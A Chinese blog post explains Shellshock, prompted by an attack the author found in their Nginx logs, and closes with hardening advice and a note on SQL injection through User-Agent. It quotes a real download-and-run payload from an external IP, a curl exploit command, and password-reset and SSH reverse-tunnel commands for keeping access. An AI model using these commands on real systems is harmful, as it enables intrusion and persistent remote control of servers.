---
title: User-Agent 也能用来发起攻击
date: 2016-12-25 10:19
excerpt: "Shell 注入和 SQL 注入"
categories:
- history
- security
- injection
feature_image: "/assets/static/img/content.jpg?image=872"
---

## Attack with Shellshock
在记录了这么多的文档、笔记中，重要要在这个公众号中发一篇和攻击相关的记录了。写这篇内容的起因，是因为我在做 Nginx 日志分析的时候，用了 JSON 格式记录日志，但是某些不能被 JSON 解析的格式当做异常日志用邮件发了出来，其中一条日志引起了我的注意。

看到这个标题的时候，大概会想到 2014 年 9 月闹的沸沸扬扬的事件，那个礼拜内，几乎我加过的所有行业内的 QQ 群都在讨论它，影响非常大。

在今天凌晨 01：30 的时候，我收到一封邮件，邮件内容是一条完整的 Nginx 日志，日志中的 User-Agent 是这样的

``` shell
   "http_user_agent": "() { :;}; /bin/bash -c \x22rm -rf /tmp/w*;wget http://178.18.24.165/wp2 -O /tmp/wp2;curl -o /tmp/wp2 http://178.18.24.165/wp2;chmod +x /tmp/wp2;sh /tmp/wp2;rm -rf /tmp/w*\x22"
```

在这里，\x22 表示单引号，将其中的命令忽略后大概会变成这样：

``` shell
   () { :;}; /bin/bash -c 'command'
```

这个先放在这里，接下来还要提到两个前提。

### CGI 是什么？怎么工作的？
事实上 CGI、FastCGI 等等这些都是不同的东西，但是和主题无关，所以这里统称它们为 **CGI**，**CGI** 的技术是用来在 WEB 中解析动态语言的而生成动态页面的技术，比如，**Nginx** 本身并没有处理任何语言的能力，但是它能将请求转发给能够处理这些请求的其他服务，这里的“其他服务”指的就是 **CGI** 了。

在忽略各个 **CGI** 之间的区别的时候，我在这里用管理 **FastCGI** 的 **PHP-FPM + Nginx** 来举例，当 **Nginx** 接收到一个请求之后，**Nginx** 将当前这个请求的所有参数：包括 **环境变量** 、**HTTP header** 等数据发送给 **PHP-FPM**，**PHP-FPM** 主进程接收到这个请求后，调用已启动或者如果需要的话，启动一个新的进程来处理。

注意这里的 __环境变量__

### Shellshock
不得不说，我这篇小文章写了好几个小时了，因为我在边看恐怖片边写，真受不了自己 - -|||

在 **Bash 4.3** 之前的版本中，有一个 BUG，这个 BUG 事实上曾经被发现过，但是当时以为这个 BUG 只有在登录系统之后才能被执行，所以没有人理会它，它被当成一个可忽略的小问题。

而 **CGI** ！！！，我记得之前看过一篇文章，一个国外的大佬写的，大意是说 CGI 这种东西，是一个非常烂的技术，根本不应该被开发出来。

再回到刚才那个 User-Agent 的例子中：

``` shell
   () { :;}; /bin/bash -c 'command'
```

() { :;}; 这个部分是在定义一个没有名字且没有任何操作的的空函数

而在 **Bash 4.3** 之前的版本中，几乎所有版本都有这样一个问题，那就是在定义这样一个空函数时，并不检查尾部何时结束，而是执行所有 () { 之后的命令(操作)。

所以，在本例中，当 Nginx 接收到一个请求后，会将它的 **Header** 发送给 **CGI**，而 **CGI** 会将这些数据放到系统的环境变量中，而在初始化这些环境变量的时候，Boom~ 这个 User-Agent 在初始化的过程中就会被执行了。

## 有没有可能轻轻松松的做个黑客呢？
即使你不会使用更高级的语言，光会一个 **curl** 便可以简单的攻击并且攻击一个基于 **Nginx**、其他 **CGI** 的程序，再加上一个低版本的 **Bash**，如果对方的 **FPM** 是跑在**root** 账号下，并且允许 **root** 通过 **ssh** 远程登录的话，嘿嘿嘿~~~

你只需要在 **curl** 命令行中指定你要执行的命令就好，比如:

``` shell
   curl --user-agent "() { :;}; /bin/bash -c \x22 command \x22" http://xxx.xx.xxx/
```

这里的 **command** 可以像上述示例中的行为一样，从你的服务器上下载一个脚本，然后执行它，比如，先修改密码，然后，嘿嘿嘿~~~，有的服务器是在内网的，通过 **nat** 映射 **HTTP** 端口出网，但是，如果像下面这样：

``` shell
   echo "somthing you wanna password" | passwd --stdin
   ssh -C -f -N -g -R 1235:localhost:22 <your ip> -p <your ssh port>
```

这条命令的作用是在对方的服务器上执行，将对方的 **22** 端口的映射到你的服务器的 **1235** 端口上，这样的话，即使对方是隐藏在 **NAT** 的网络里，你仍旧可以通过登录在你自己的
服务器的 **IP** 的 **1235** 端口来登录到对方的服务器。

### 怎么防御呢？

有了上边的例子，就要有防范别人对你这么干，所以，如果有以下这样几个条件，也就能防止大多数攻击了。

1. 首先第一点就是升级你的 Bash，如果这个漏洞两年过去了你还没升级，呵呵呵呵~
2. 任何服务都不应该跑在 root 账号下
3. root 不应该被允许 ssh 登录
4. 跑服务的用户不应该被允许登录，我通常的做法是将它的 shell 改为 /sbin/nologin
5. 严格控制文件系统中各目录的权限，让这些用来跑服务的账号尽可能的减少对非工作目录读写的权限

### SQL Injection
上例中说的是一种典型的注入攻击，**Shell** 注入，很有意思哈~

现在简单说一个同样利用 **User-Agent** 来注入 **SQL** 的过程，事实上也是我正在犯的一个错，我做过，现在也在做一些日志分析的工具，将来也要做更大的日志分析平台，在我过去以及现在做的日志分析工具的中，我会把 **User-Agent** 以及其他信息直接保存到数据库中，__Just like MySQL__。

所以，当你在直接把这些嵌套了 SQL 语句的内容保存的 MySQL 中的时候，这些语句将会被执行。

大家更常见的是你的面向用户的程序中的 SQL 注入，所以会忽略类似这样的攻击，好吧，可能并不是所有人，但至少我是其中之一，呵呵哒

### End
上一篇说了我会选择记录一篇 **KeepAlived**，看起来得下次了。